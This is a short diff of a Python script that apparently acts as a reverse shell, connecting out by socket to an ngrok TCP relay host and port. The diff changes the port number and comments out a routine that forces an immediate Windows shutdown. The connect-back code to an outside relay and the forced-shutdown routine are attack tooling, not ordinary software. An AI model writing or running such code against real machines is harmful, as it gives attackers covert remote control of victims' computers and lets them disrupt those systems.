@@ -32,7 +32,7 @@ import socket
 import subprocess
 
 IP = "0.tcp.in.ngrok.io"   # Host from your ngrok forwarding address
-PORT = 15152               # Port from your ngrok forwarding address
+PORT = 19468               # Port from your ngrok forwarding address
 
 s = socket.socket()
 s.connect((IP, PORT))
@@ -52,8 +52,8 @@ s.close()
 
 
 
-def shutdown_windows():
-    print('shutting down bro')
-    os.system("shutdown /s /t 0")  # Shutdowns Windows after 2 seconds
+#def shutdown_windows():
+    #print('shutting down bro')
+    #os.system("shutdown /s /t 0")  # Shutdowns Windows after 2 seconds
 
-shutdown_windows()                # Executes the shutdown
+#shutdown_windows()                # Executes the shutdown
